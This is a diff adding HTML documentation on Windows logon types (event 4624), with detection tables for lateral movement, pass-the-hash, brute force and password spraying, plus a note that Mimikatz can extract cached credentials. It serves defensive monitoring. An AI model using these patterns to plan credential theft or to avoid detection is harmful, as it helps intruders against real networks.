+<p><strong>Description:</strong> A user or computer logged on to this computer from the network.</p>
+<p>This event is logged when someone accesses a computer from the network, commonly when connecting to shared resources.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Most common for accessing shared folders, printers, etc.</li>
+<li>Can be established even from the local computer (e.g., <code>net use \\localhost\share</code>)</li>
+<li>No interactive session is created</li>
+</ul>
+<p><strong>Common Scenarios:</strong></p>
+<ul>
+<li>Mapping network drives</li>
+<li>Accessing file shares (SMB)</li>
+<li>WMI remote queries</li>
+<li>Many admin tools that connect remotely</li>
+</ul>
+<p><strong>Security Note:</strong> Pass-the-Hash attacks typically generate type 3 logon events.</p>
+<hr>
+<h3 id="logon-type-4-batch"><a class="header" href="#logon-type-4-batch">Logon Type 4: Batch</a></h3>
+<p><strong>Description:</strong> Batch logon type is used by batch servers, where processes may be executing on behalf of a user without their direct intervention.</p>
+<p>This event occurs when a scheduled task is started.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Windows Task Scheduler creates a new logon session to execute tasks</li>
+<li>If a task is configured to run only when a user is logged on, no new session is created</li>
+<li>Related events: 4648 (explicit credentials), 4624/4625 (logon success/failure)</li>
+</ul>
+<p><strong>Common Scenarios:</strong></p>
+<ul>
+<li>Scheduled tasks running under a specific user account</li>
+<li>Batch job execution</li>
+</ul>
+<hr>
+<h3 id="logon-type-5-service"><a class="header" href="#logon-type-5-service">Logon Type 5: Service</a></h3>
+<p><strong>Description:</strong> A service was started by the Service Control Manager.</p>
+<p>When Windows starts a service configured to log on as a user, it creates a new logon session.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Only occurs for services using standard user accounts</li>
+<li>Does NOT occur for special accounts:
+<ul>
+<li>Local System</li>
+<li>NT AUTHORITY\LocalService</li>
+<li>NT AUTHORITY\NetworkService</li>
+</ul>
+</li>
+<li>Logoff event (4634) is registered when the service stops</li>
+<li>Event description does NOT contain the service name (only shows services.exe)</li>
+</ul>
+<p><strong>Security Note:</strong> Audit Failure (4625) with type 5 commonly indicates the service account password was changed and needs to be updated in service configuration.</p>
+<hr>
+<h3 id="logon-type-7-unlock"><a class="header" href="#logon-type-7-unlock">Logon Type 7: Unlock</a></h3>
+<p><strong>Description:</strong> This workstation was unlocked.</p>
+<p>Occurs when a user unlocks (or attempts to unlock) a previously locked workstation.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Windows creates a new logon session and immediately closes it (with event 4634)</li>
+<li>Fast User Switching generates type 2 (Interactive), NOT type 7</li>
+<li>May generate 2 logon sessions depending on UAC elevation conditions</li>
+</ul>
+<p><strong>Security Note:</strong> Audit Failure (4625) with type 7 indicates either a typo or a potential brute-force attempt against a locked workstation.</p>
+<hr>
+<h3 id="logon-type-8-networkcleartext"><a class="header" href="#logon-type-8-networkcleartext">Logon Type 8: NetworkCleartext</a></h3>
+<p><strong>Description:</strong> A user logged on from the network with credentials passed in cleartext (unhashed form).</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Should rarely be seen in modern environments</li>
+<li>Credentials do NOT traverse the network in plaintext with built-in authentication packages</li>
+<li>Commonly associated with IIS basic authentication</li>
+</ul>
+<p><strong>Security Warning:</strong> Cleartext password transmission is dangerous. If basic authentication is required:</p>
+<ul>
+<li>Use SSL/TLS encryption</li>
+<li>Implement VPN</li>
+<li>Consider alternative authentication methods</li>
+</ul>
+<hr>
+<h3 id="logon-type-9-newcredentials"><a class="header" href="#logon-type-9-newcredentials">Logon Type 9: NewCredentials</a></h3>
+<p><strong>Description:</strong> A caller cloned its current token and specified new credentials for outbound connections.</p>
+<p>Occurs when using <code>runas /netonly</code> - the new session uses current credentials locally but different credentials for network connections.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Local identity remains the same</li>
+<li>Different credentials used for network connections</li>
+<li>Program runs even if wrong password is provided (uses cloned current credentials)</li>
+<li>Logoff event logged when application exits</li>
+<li>Remote server logs type 3 when the application accesses its resources</li>
+</ul>
+<p><strong>Example:</strong></p>
+<pre><code class="language-cmd">runas.exe /netonly /user:DOMAIN\Administrator "cmd.exe"
+</code></pre>
+<p><strong>Use Cases:</strong></p>
+<ul>
+<li>Running admin tools with elevated network permissions</li>
+<li>Accessing resources in different domains</li>
+<li>Testing connectivity with different credentials</li>
+</ul>
+<hr>
+<h3 id="logon-type-10-remoteinteractive"><a class="header" href="#logon-type-10-remoteinteractive">Logon Type 10: RemoteInteractive</a></h3>
+<p><strong>Description:</strong> A user logged on remotely using Terminal Services or Remote Desktop.</p>
+<p>Similar to type 2 (Interactive) but the user connects from a remote machine via RDP.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Generated for RDP sessions</li>
+<li>Terminal Services connections</li>
+<li>Remote Assistance sessions</li>
+</ul>
+<p><strong>Common Scenarios:</strong></p>
+<ul>
+<li>Remote Desktop connections</li>
+<li>Terminal Server sessions</li>
+<li>Remote Assistance</li>
+</ul>
+<p><strong>Security Note:</strong> Monitor for unexpected type 10 events, especially from unusual source IPs or outside business hours.</p>
+<hr>
+<h3 id="logon-type-11-cachedinteractive"><a class="header" href="#logon-type-11-cachedinteractive">Logon Type 11: CachedInteractive</a></h3>
+<p><strong>Description:</strong> A user logged on with network credentials stored locally. The domain controller was not contacted.</p>
+<p>When domain users log on and the DC is unavailable, Windows validates against cached credential hashes.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Windows caches 10-25 last logon credentials by default (OS dependent)</li>
+<li>Can be increased up to 50 cached credentials</li>
+<li>Useful for laptops and mobile users</li>
+<li>DC is not contacted for validation</li>
+</ul>
+<p><strong>Security Implications:</strong></p>
+<ul>
+<li>Cached credentials can be extracted with tools like Mimikatz</li>
+<li>Consider reducing the cache count on sensitive systems</li>
+<li>Registry key: <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\CachedLogonsCount</code></li>
+</ul>
+<hr>
+<h2 id="security-monitoring-use-cases"><a class="header" href="#security-monitoring-use-cases">Security Monitoring Use Cases</a></h2>
+<h3 id="detecting-lateral-movement"><a class="header" href="#detecting-lateral-movement">Detecting Lateral Movement</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Indicator</th><th>Logon Type</th><th>Notes</th></tr>
+</thead>
+<tbody>
+<tr><td>Pass-the-Hash</td><td>3</td><td>Network logon from unexpected sources</td></tr>
+<tr><td>RDP Lateral Movement</td><td>10</td><td>RemoteInteractive from internal hosts</td></tr>
+<tr><td>PsExec-style tools</td><td>3</td><td>Network logon followed by service creation</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="detecting-credential-attacks"><a class="header" href="#detecting-credential-attacks">Detecting Credential Attacks</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Indicator</th><th>Logon Type</th><th>Notes</th></tr>
+</thead>
+<tbody>
+<tr><td>Brute Force (local)</td><td>2, 7</td><td>Multiple failures on same workstation</td></tr>
+<tr><td>Brute Force (network)</td><td>3</td><td>Multiple type 3 failures from same source</td></tr>
+<tr><td>Password Spray</td><td>3</td><td>Single failure across many accounts</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="suspicious-patterns"><a class="header" href="#suspicious-patterns">Suspicious Patterns</a></h3>
+<ul>
+<li>Type 10 (RDP) from external IPs</li>
+<li>Type 9 (NewCredentials) on servers</li>
+<li>Type 8 (NetworkCleartext) anywhere</li>
+<li>Type 3 to sensitive servers from workstations</li>
+<li>Type 4/5 failures indicating misconfigured services</li>
+</ul>
+<hr>
+<h2 id="related-event-ids"><a class="header" href="#related-event-ids">Related Event IDs</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Event ID</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>4624</td><td>Successful logon</td></tr>
+<tr><td>4625</td><td>Failed logon</td></tr>
+<tr><td>4634</td><td>Logoff</td></tr>
+<tr><td>4647</td><td>User initiated logoff</td></tr>
+<tr><td>4648</td><td>Logon with explicit credentials</td></tr>
+<tr><td>4672</td><td>Special privileges assigned</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="references-7"><a class="header" href="#references-7">References</a></h2>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events">Microsoft Docs - Audit Logon Events</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624">Event ID 4624 - An account was successfully logged on</a></li>
+<li><a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624">Ultimate Windows Security - Logon Type Codes</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="electronics"><a class="header" href="#electronics">Electronics</a></h1>
